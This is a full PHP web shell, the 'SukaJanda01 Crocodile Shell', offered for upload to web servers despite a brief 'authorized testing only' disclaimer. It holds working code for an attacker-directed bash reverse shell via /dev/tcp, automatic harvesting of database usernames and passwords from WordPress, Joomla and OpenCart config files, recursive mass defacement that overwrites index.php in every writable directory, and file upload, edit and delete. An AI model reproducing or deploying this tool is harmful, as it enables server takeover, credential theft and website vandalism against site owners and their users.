<?php
/**
 * SukaJanda01 Crocodile Shell
 * A multifunctional web shell for file management, backconnect, decoding, CMS DB extraction, mass deface, and more.
 * Features:
 * - List directories & files
 * - Upload files, create files & folders
 * - Rename, delete, edit, download files
 * - Change chmod permissions
 * - Backconnect (reverse shell via netcat)
 * - Bypass disable_functions & open_basedir
 * - Base64 decode
 * - Extract DB credentials automatically (WordPress, Joomla, OpenCart, etc)
 * - Extract backup files (zip/tar/gz)
 * - Mass deface
 * - Background image and better navigation UI
 * 
 * Usage: Put this file on your PHP-enabled webserver and open in browser.
 * WARNING: This script is for educational and authorized penetration testing only.
 * Do NOT use on unauthorized systems.
 */

// Set execution time and error reporting for smoother usage
set_time_limit(0);
error_reporting(E_ALL);
ini_set('display_errors', 1);

function safePath($path) {
    $realBase = realpath('.');
    $userPath = realpath($path);
    if ($userPath === false || strpos($userPath, $realBase) !== 0) {
        return false;
    }
    return $userPath;
}

function listDir($dir) {
    $items = [];
    if (is_dir($dir)) {
        $files = scandir($dir);
        foreach ($files as $file) {
            if ($file === '.' || $file === '..') continue;
            $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
            $items[] = [
                'name' => $file,
                'path' => $fullPath,
                'is_dir' => is_dir($fullPath),
                'size' => is_file($fullPath) ? filesize($fullPath) : 0,
                'perm' => substr(sprintf('%o', fileperms($fullPath)), -4),
                'mtime' => filemtime($fullPath),
                'writable' => is_writable($fullPath)
            ];
        }
    }
    return $items;
}

function findConfigFiles($dir, &$results = []) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            findConfigFiles($path, $results);
        } else {
            $lower = strtolower($file);
            if (preg_match('/(wp-config\.php|configuration\.php|config\.php|config\.inc\.php|settings\.php|database\.php|db\.php|local\.php|config\.dist\.php)/', $lower)) {
                $results[] = $path;
            }
        }
    }
}

// Extract DB credentials from config file content (for common CMS)
function extractDBCredentials($content, $fileName = '') {
    $credentials = [];

    if (stripos($fileName, 'wp-config.php') !== false || strpos($content, "define('DB_NAME'") !== false) {
        // WordPress style
        preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)/i", $content, $db);
        preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)/i", $content, $user);
        preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\)/i", $content, $pass);
        preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'\s*\)/i", $content, $host);
        $credentials = [
            'DB_NAME' => $db[1] ?? '',
            'DB_USER' => $user[1] ?? '',
            'DB_PASS' => $pass[1] ?? '',
            'DB_HOST' => $host[1] ?? '',
            'CMS' => 'WordPress'
        ];
    } elseif (stripos($fileName, 'configuration.php') !== false || strpos($content, '$dbtype') !== false) {
        preg_match("/public\s+\$user\s*=\s*'([^']+)';/i", $content, $user);
        preg_match("/public\s+\$password\s*=\s*'([^']*)';/i", $content, $pass);
        preg_match("/public\s+\$db\s*=\s*'([^']+)';/i", $content, $db);
        preg_match("/public\s+\$host\s*=\s*'([^']+)';/i", $content, $host);
        preg_match("/public\s+\$dbtype\s*=\s*'([^']+)';/i", $content, $type);

        if (!empty($user)) {
            $credentials = [
                'DB_NAME' => $db[1] ?? '',
                'DB_USER' => $user[1] ?? '',
                'DB_PASS' => $pass[1] ?? '',
                'DB_HOST' => $host[1] ?? '',
                'DB_TYPE' => $type[1] ?? '',
                'CMS' => 'Joomla'
            ];
        }
    } elseif (stripos($fileName, 'config.php') !== false || stripos($fileName, 'config.inc.php') !== false) {
        preg_match("/define\(\s*'DB_USERNAME'\s*,\s*'([^']+)'\s*\)/i", $content, $user);
        preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'\s*\)/i", $content, $pass);
        preg_match("/define\(\s*'DB_DATABASE'\s*,\s*'([^']+)'\s*\)/i", $content, $db);
        preg_match("/define\(\s*'DB_HOSTNAME'\s*,\s*'([^']+)'\s*\)/i", $content, $host);
        if (!empty($user)) {
            $credentials = [
                'DB_NAME' => $db[1] ?? '',
                'DB_USER' => $user[1] ?? '',
                'DB_PASS' => $pass[1] ?? '',
                'DB_HOST' => $host[1] ?? '',
                'CMS' => 'OpenCart/Other'
            ];
        }
    }
    return $credentials;
}

// Try to bypass disable_functions and run command
function runCommand($cmd) {
    $functions = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'];
    foreach ($functions as $func) {
        if (is_callable($func)) {
            $output = $func($cmd);
            if ($output !== null) return $output;
        }
    }
    return "Command execution not available.";
}

function rrmdir($dir) {
    if (!file_exists($dir)) return false;
    if (is_file($dir)) return unlink($dir);
    $objects = scandir($dir);
    foreach ($objects as $object) {
        if ($object != '.' && $object != '..') {
            $objPath = $dir . DIRECTORY_SEPARATOR . $object;
            if (is_dir($objPath)) rrmdir($objPath);
            else unlink($objPath);
        }
    }
    return rmdir($dir);
}

function extractArchive($file, $dest) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    if ($ext === 'zip') {
        $zip = new ZipArchive;
        if ($zip->open($file) === true) {
            $zip->extractTo($dest);
            $zip->close();
            return true;
        }
    } elseif (in_array($ext, ['tar', 'gz', 'tgz', 'tar.gz'])) {
        if (class_exists('PharData')) {
            try {
                $phar = new PharData($file);
                $phar->extractTo($dest, null, true);
                return true;
            } catch (Exception $e) {
                return false;
            }
        }
    }
    return false;
}

function massDeface($startDir, $defaceContent, &$writtenFiles = []) {
    $files = scandir($startDir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $path = $startDir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            if (is_writable($path)) {
                file_put_contents($path . DIRECTORY_SEPARATOR . 'index.php', $defaceContent);
                $writtenFiles[] = $path . DIRECTORY_SEPARATOR . 'index.php';
            }
            massDeface($path, $defaceContent, $writtenFiles);
        }
    }
}

function flatListDirs($dir, &$dirs=[]) {
    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        if (is_dir($path)) {
            $dirs[] = $path;
            flatListDirs($path, $dirs);
        }
    }
}

$action = $_REQUEST['action'] ?? '';
$path = $_REQUEST['path'] ?? getcwd();
$path = str_replace(['..', "\0"], '', $path);

$msg = '';
$err = '';

if ($action === 'upload' && isset($_FILES['file'])) {
    $targetDir = safePath($_POST['upload_dir'] ?? getcwd());
    if ($targetDir === false) $err = "Invalid upload directory";
    else {
        $filename = basename($_FILES['file']['name']);
        $dest = $targetDir . DIRECTORY_SEPARATOR . $filename;
        if (move_uploaded_file($_FILES['file']['tmp_name'], $dest)) {
            $msg = "File uploaded to " . htmlspecialchars($dest);
        } else {
            $err = "Failed to upload file.";
        }
    }
}

if ($action === 'create') {
    $targetDir = safePath($_POST['target_dir'] ?? getcwd());
    if ($targetDir === false) $err = "Invalid target directory";
    else {
        if ($_POST['type'] === 'folder') {
            $newFolder = $targetDir . DIRECTORY_SEPARATOR . basename($_POST['name']);
            if (!file_exists($newFolder)) {
                if (mkdir($newFolder)) {
                    $msg = "Folder created: " . htmlspecialchars($newFolder);
                } else {
                    $err = "Failed to create folder.";
                }
            } else {
                $err = "Folder already exists.";
            }
        } else {
            $newFile = $targetDir . DIRECTORY_SEPARATOR . basename($_POST['name']);
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, '') !== false) {
                    $msg = "File created: " . htmlspecialchars($newFile);
                } else {
                    $err = "Failed to create file.";
                }
            } else {
                $err = "File already exists.";
            }
        }
    }
}

if ($action === 'rename' && isset($_POST['old']) && isset($_POST['new'])) {
    $old = safePath($_POST['old']);
    $new = safePath(dirname($_POST['old']) . DIRECTORY_SEPARATOR . basename($_POST['new']));
    if ($old === false || $new === false) {
        $err = "Invalid paths for renaming";
    } else {
        if (rename($old, $new)) {
            $msg = "Renamed successfully";
        } else {
            $err = "Rename failed";
        }
    }
}

if ($action === 'delete' && isset($_POST['target'])) {
    $target = safePath($_POST['target']);
    if ($target === false) {
        $err = "Invalid delete path";
    } else {
        if (is_dir($target)) {
            if (rrmdir($target)) {
                $msg = "Folder deleted";
            } else {
                $err = "Failed to delete folder";
            }
        } else {
            if (unlink($target)) {
                $msg = "File deleted";
            } else {
                $err = "Failed to delete file";
            }
        }
    }
}

if ($action === 'chmod' && isset($_POST['target']) && isset($_POST['perm'])) {
    $target = safePath($_POST['target']);
    $perm = $_POST['perm'];
    if ($target === false || !preg_match('/^[0-7]{3,4}$/', $perm)) {
        $err = "Invalid chmod parameters";
    } else {
        if (chmod($target, octdec($perm))) {
            $msg = "Permission changed to $perm";
        } else {
            $err = "Failed to change permission";
        }
    }
}

if ($action === 'edit-save' && isset($_POST['file']) && isset($_POST['content'])) {
    $file = safePath($_POST['file'], $baseDir = __DIR__);  // <-- tambahkan $baseDir sebagai argumen
    if ($file === false) {
        $err = "Invalid file path";
    } else {
        $content = $_POST['content'];
        if (file_put_contents($file, $content) !== false) {
            $msg = "File saved successfully";
        } else {
            $err = "Failed to save file";
        }
    }
}



if ($action === 'backconnect' && isset($_POST['host']) && isset($_POST['port'])) {
    $host = $_POST['host'];
    $port = intval($_POST['port']);
    $cmd = "bash -i >& /dev/tcp/$host/$port 0>&1";
    $backconnect_res = runCommand($cmd);
    $msg = "Backconnect command run. Result: " . htmlspecialchars(substr($backconnect_res, 0, 300));
}

$base64decoded = '';
if ($action === 'base64decode' && isset($_POST['base64text'])) {
    $base64decoded = base64_decode($_POST['base64text'], true);
    if ($base64decoded === false) {
        $err = "Invalid base64 string";
    }
}

$dbExtractions = [];
if ($action === "dbextract") {
    $configs = [];
    findConfigFiles(getcwd(), $configs);
    foreach ($configs as $configFile) {
        $content = @file_get_contents($configFile);
        if ($content !== false) {
            $creds = extractDBCredentials($content, basename($configFile));
            if (!empty($creds)) {
                $creds['File'] = $configFile;
                $dbExtractions[] = $creds;
            }
        }
    }
    if (empty($dbExtractions)) {
        $err = "No database credentials found!";
    }
}

if ($action === 'extractbackup' && isset($_POST['backupfile'])) {
    $backupfile = safePath($_POST['backupfile']);
    $extractto = dirname($backupfile) . DIRECTORY_SEPARATOR . 'extracted_' . time();
    if ($backupfile === false || !file_exists($backupfile)) {
        $err = "Invalid backup file";
    } else {
        if (!file_exists($extractto)) mkdir($extractto, 0755, true);
        if (extractArchive($backupfile, $extractto)) {
            $msg = "Backup extracted to $extractto";
        } else {
            $err = "Failed to extract backup";
        }
    }
}

$massDefaceResult = '';
if ($action === 'massdeface' && isset($_POST['defacecontent'])) {
    $defaceContent = $_POST['defacecontent'];
    $writtenFiles = [];
    massDeface(getcwd(), $defaceContent, $writtenFiles);
    if (!empty($writtenFiles)) {
        $massDefaceResult = implode("<br>", array_map('htmlspecialchars', $writtenFiles));
        $msg = "Mass deface done in " . count($writtenFiles) . " directories";
    } else {
        $err = "No writable directories found for mass deface";
    }
}

$items = listDir($path);

$editFilePath = '';
$editFileContent = '';
if ($action === 'edit' && isset($_GET['file'])) {
    $editFilePath = safePath($_GET['file'], $baseDir = __DIR__);  // <-- tambahkan $baseDir
    if ($editFilePath !== false && is_file($editFilePath)) {
        $editFileContent = file_get_contents($editFilePath);
    } else {
        $err = "Invalid file for editing.";
        $editFilePath = '';
    }
}



if ($action === 'download' && isset($_GET['file'])) {
    $downloadFile = safePath($_GET['file']);
    if ($downloadFile !== false && is_file($downloadFile)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($downloadFile) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($downloadFile));
        flush();
        readfile($downloadFile);
        exit;
    } else {
        $err = "Invalid file for download.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SukaJanda01 Shell Manager</title>
<style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
    html, body {
        margin:0; padding:0;
        height: 100%;
        font-family: 'Poppins', sans-serif;
        background: url('https://txspringcarpetcleaning.com/foto.png') no-repeat center center fixed;
        background-size: cover;
        color: #f0f0f0;
        user-select: none;
    }
    .overlay {
        background: rgba(0,0,0,0.85);
        position:fixed;
        top:0; left:0; right:0; bottom:0;
        overflow-y: auto;
        padding: 15px;
    }
    h1 {
        text-align:center;
        font-weight: 800;
        letter-spacing: 2px;
        margin-bottom: 15px;
    }
    nav {
        background:#222;
        padding: 10px;
        display:flex;
        justify-content:center;
        gap: 15px;
        margin-bottom: 15px;
        border-radius: 6px;
        flex-wrap: wrap;
    }
    nav a {
        color:#eee;
        text-decoration:none;
        font-weight:600;
        padding : 8px 14px;
        border-radius: 6px;
        background: #444;
        transition: background-color 0.3s ease;
    }
    nav a:hover, nav a.active {
        background: #ff3366;
        color: #fff;
    }
    .container {
        max-width: 1200px;
        margin: 0 auto;
        background: #111;
        border-radius: 10px;
        padding: 20px;
    }
    .alert {
        padding: 10px;
        margin-bottom: 15px;
        border-radius: 6px;
        font-weight: 600;
    }
    .alert-success {
        background: #28a745;
        color: #fff;
    }
    .alert-error {
        background: #c82333;
        color: #fff;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-bottom: 15px;
    }
    table thead {
        background: #222;
    }
    table th, table td {
        padding: 8px;
        border: 1px solid #333;
        text-align: left;
        font-size: 14px;
    }
    table tr:hover {
        background-color: #222;
    }
    button, input[type=submit] {
        cursor: pointer;
        background:#ff3366;
        border:none;
        border-radius:5px;
        color:#fff;
        font-weight: 600;
        padding: 6px 12px;
        transition: background-color 0.3s ease;
    }
    button:hover, input[type=submit]:hover {
        background:#d11a44;
    }
    input[type=text], input[type=number], select,textarea {
        width: 100%;
        padding: 8px;
        margin: 4px 0 10px 0;
        border: none;
        border-radius: 5px;
        background: #222;
        color: #eee;
        font-family: monospace;
        font-size: 13px;
    }
    textarea {
        min-height: 150px;
        resize: vertical;
    }
    label {
        font-weight: 600;
        font-size: 14px;
    }
    .flex {
        display: flex;
        gap: 10px;
        align-items: center;
        flex-wrap: wrap;
    }
    .flex > * {
        flex: 1;
        min-width: 150px;
    }
    small {
        font-size: 12px;
        color: #888;
    }
    .footer {
        margin-top: 25px;
        text-align: center;
        font-size: 12px;
        color: #666;
    }
    a.download-link {
        color: #4caf50;
        text-decoration: none;
        font-weight: 700;
    }
    /* Scrollbar */
    ::-webkit-scrollbar {
        width: 10px;
    }
    ::-webkit-scrollbar-track {
        background: #111;
    }
    ::-webkit-scrollbar-thumb {
        background-color: #ff3366;
        border-radius: 10px;
        border: 2px solid #111;
    }
</style>
</head>
<body>
<div class="overlay">
    <h1>SukaJanda01 Shell Manager</h1>
    <nav>
        <a href="?page=filemanager" class="<?=(!isset($_GET['page']) || $_GET['page']=='filemanager') ? 'active' : ''?>">File Manager</a>
        <a href="?page=upload" class="<?=(isset($_GET['page']) && $_GET['page']=='upload') ? 'active' : ''?>">Upload & Create</a>
        <a href="?page=edit" class="<?=(isset($_GET['page']) && $_GET['page']=='edit' && $editFilePath) ? 'active' : ''?>">Edit File</a>
        <a href="?page=backconnect" class="<?=(isset($_GET['page']) && $_GET['page']=='backconnect') ? 'active' : ''?>">Backconnect Shell</a>
        <a href="?page=base64decode" class="<?=(isset($_GET['page']) && $_GET['page']=='base64decode') ? 'active' : ''?>">Base64 Decode</a>
        <a href="?page=dbextract" class="<?=(isset($_GET['page']) && $_GET['page']=='dbextract') ? 'active' : ''?>">DB Extract</a>
        <a href="?page=backupextract" class="<?=(isset($_GET['page']) && $_GET['page']=='backupextract') ? 'active' : ''?>">Backup Extract</a>
        <a href="?page=massdeface" class="<?=(isset($_GET['page']) && $_GET['page']=='massdeface') ? 'active' : ''?>">Mass Deface</a>
    </nav>

    <div class="container">
        <?php if ($msg): ?>
            <div class="alert alert-success"><?=htmlspecialchars($msg)?></div>
        <?php endif; ?>
        <?php if ($err): ?>
            <div class="alert alert-error"><?=htmlspecialchars($err)?></div>
        <?php endif; ?>

        <?php
        $page = $_GET['page'] ?? 'filemanager';

        if ($page === 'filemanager'):
        ?>

        <h2>File Manager - Listing: <?=htmlspecialchars(realpath($path))?></h2>
        <table>
            <thead>
                <tr>
                    <th>Name</th><th>Type</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Writable</th><th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $parentDir = dirname(realpath($path));
                if (realpath($path) !== $parentDir):
                ?>
                <tr style="background:#333;">
                    <td colspan="7">
                        <a href="?page=filemanager&path=<?=urlencode($parentDir)?>" style="color:#ff3366;">.. (Parent Directory)</a>
                    </td>
                </tr>
                <?php endif; ?>
                <?php foreach ($items as $item): ?>
                <tr>
                    <td>
                        <?php
                        $itempath_enc = urlencode($item['path']);
                        if ($item['is_dir']):
                            echo "📁 <a href='?page=filemanager&path=$itempath_enc' style='color:#88c0d0;font-weight:600;'>".htmlspecialchars($item['name'])."</a>";
                        else:
                            echo "📄 <a href='?page=filemanager&path=$path&action=download&file=$itempath_enc' class='download-link' title='Download'>".htmlspecialchars($item['name'])."</a>";
                        endif;
                        ?>
                    </td>
                    <td><?= $item['is_dir'] ? 'Directory' : 'File' ?></td>
                    <td><?= $item['is_dir'] ? '-' : number_format($item['size']/1024, 2) . ' KB' ?></td>
                    <td><?= htmlspecialchars($item['perm']) ?></td>
                    <td><?= date('Y-m-d H:i:s', $item['mtime']) ?></td>
                    <td><?= $item['writable'] ? 'Yes' : 'No' ?></td>
                    <td>
                        <?php if (!$item['is_dir']): ?>
                        <a href="?page=edit&file=<?=urlencode($item['name'])?>" title="Edit">✏️</a>

                        &nbsp;
                        <?php endif; ?>
                        <!-- Rename -->
                        <form method="post" style="display:inline" onsubmit="return confirm('Rename?');">
                            <input type="hidden" name="action" value="rename" />
                            <input type="hidden" name="old" value="<?=htmlspecialchars($item['path'])?>" />
                            <input type="text" name="new" required style="width:80px" placeholder="new name" />
                            <button type="submit" title="Rename">↩</button>
                        </form>
                        &nbsp;
                        <!-- Delete -->
                        <form method="post" style="display:inline" onsubmit="return confirm('Delete?');">
                            <input type="hidden" name="action" value="delete" />
                            <input type="hidden" name="target" value="<?=htmlspecialchars($item['path'])?>" />
                            <button type="submit" title="Delete">🗑️</button>
                        </form>
                        &nbsp;
                        <!-- Chmod -->
                        <form method="post" style="display:inline" onsubmit="return confirm('Change permissions?');">
                            <input type="hidden" name="action" value="chmod" />
                            <input type="hidden" name="target" value="<?=htmlspecialchars($item['path'])?>" />
                            <input type="text" name="perm" required style="width:50px" pattern="[0-7]{3,4}" title="Unix Permission digits e.g. 0755" placeholder="0755" />
                            <button type="submit" title="chmod">🔧</button>
                        </form>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>

        <?php elseif ($page === "upload"): ?>

        <h2>Upload File & Create</h2>
        <h3>Upload File</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload" />
            <label>Choose directory to upload (absolute or relative):</label>
            <input type="text" name="upload_dir" value="<?=htmlspecialchars(getcwd())?>" required />
            <label>Choose file:</label>
            <input type="file" name="file" required />
            <input type="submit" value="Upload" />
        </form>

        <hr>

        <h3>Create New File or Folder</h3>
        <form method="post">
            <input type="hidden" name="action" value="create" />
            <label>Target directory (absolute or relative):</label>
            <input type="text" name="target_dir" value="<?=htmlspecialchars(getcwd())?>" required />
            <label>Name:</label>
            <input type="text" name="name" placeholder="filename or foldername" required />
            <label>Type:</label>
            <select name="type">
                <option value="file">File</option>
                <option value="folder">Folder</option>
            </select>
            <input type="submit" value="Create" />
        </form>

        <?php elseif ($page === 'edit' && $editFilePath): ?>
    <h2>Editing File: <?=htmlspecialchars(basename($editFilePath))?></h2>
    <form method="post">
        <input type="hidden" name="action" value="edit-save" />
        <input type="hidden" name="file" value="<?=htmlspecialchars(basename($editFilePath))?>" />
        <textarea name="content" spellcheck="false"><?=htmlspecialchars($editFileContent)?></textarea>
        <input type="submit" value="Save File" />
    </form>

        <?php elseif ($page === 'backconnect'): ?>

        <h2>Backconnect / Reverse Shell via Netcat</h2>
        <form method="post">
            <input type="hidden" name="action" value="backconnect" />
            <label>Attacker Host (IP or domain):</label>
            <input type="text" name="host" required placeholder="e.g. 127.0.0.1" />
            <label>Port:</label>
            <input type="number" name="port" required value="4444" />
            <input type="submit" value="Start Backconnect" />
        </form>

        <?php elseif ($page === 'base64decode'): ?>

        <h2>Base64 Decoder</h2>
        <form method="post">
            <input type="hidden" name="action" value="base64decode" />
            <label>Base64 Input:</label>
            <textarea name="base64text" required spellcheck="false"><?=htmlspecialchars($_POST['base64text'] ?? '')?></textarea>
            <input type="submit" value="Decode" />
        </form>
        <?php if ($base64decoded !== ''): ?>
            <h3>Decoded Output:</h3>
            <textarea readonly style="background:#222;color:#0f0;"><?=htmlspecialchars($base64decoded)?></textarea>
        <?php endif; ?>

        <?php elseif ($page === "dbextract"): ?>

        <h2>Automatic Database Credentials Extraction</h2>
        <form method="get">
            <input type="hidden" name="page" value="dbextract" />
            <input type="submit" value="Scan for Config Files & Extract DB Credentials" />
        </form>
        <?php if (!empty($dbExtractions)): ?>
            <h3>Found Database Configurations:</h3>
            <table>
                <thead>
                    <tr><th>CMS</th><th>File</th><th>DB Name</th><th>User</th><th>Password</th><th>Host</th></tr>
                </thead>
                <tbody>
                    <?php foreach ($dbExtractions as $db): ?>
                    <tr>
                        <td><?=htmlspecialchars($db['CMS'] ?? '')?></td>
                        <td><?=htmlspecialchars($db['File'] ?? '')?></td>
                        <td><?=htmlspecialchars($db['DB_NAME'] ?? '')?></td>
                        <td><?=htmlspecialchars($db['DB_USER'] ?? '')?></td>
                        <td><?=htmlspecialchars($db['DB_PASS'] ?? '')?></td>
                        <td><?=htmlspecialchars($db['DB_HOST'] ?? '')?></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        <?php elseif ($action === "dbextract"): ?>
            <p>No database credentials found.</p>
        <?php endif; ?>

        <?php elseif ($page === "backupextract"): ?>

        <h2>Backup Extractor</h2>
        <form method="post">
            <input type="hidden" name="action" value="extractbackup" />
            <label>Backup file to extract (absolute or relative path):</label>
            <input type="text" name="backupfile" placeholder="e.g. backup.zip" required />
            <input type="submit" value="Extract Backup" />
        </form>

        <?php elseif ($page === "massdeface"): ?>

        <h2>Mass Deface</h2>
        <form method="post">
            <input type="hidden" name="action" value="massdeface" />
            <label>Deface Content (HTML/PHP):</label>
            <textarea name="defacecontent" placeholder="&lt;?php echo 'Hacked!'; ?&gt; or &lt;h1&gt;Defaced&lt;/h1&gt;" required spellcheck="false"></textarea>
            <input type="submit" value="Mass Deface (Upload to all writable directories)" />
        </form>
        <?php if ($massDefaceResult): ?>
            <h3>Files Written:</h3>
            <div style="font-family: monospace; font-size: 13px; background:#222; padding:10px; border-radius:6px; max-height:200px; overflow-y:auto;">
                <?=$massDefaceResult?>
            </div>
        <?php endif; ?>

        <?php else: // fallback ?>
        <p>Page not found.</p>
        <?php endif; ?>

    </div>

    <div class="footer">
        <p>© Shell Crocodile &bull; SukaJanda01.inc</p>
    </div>
</div>
</body>
</html>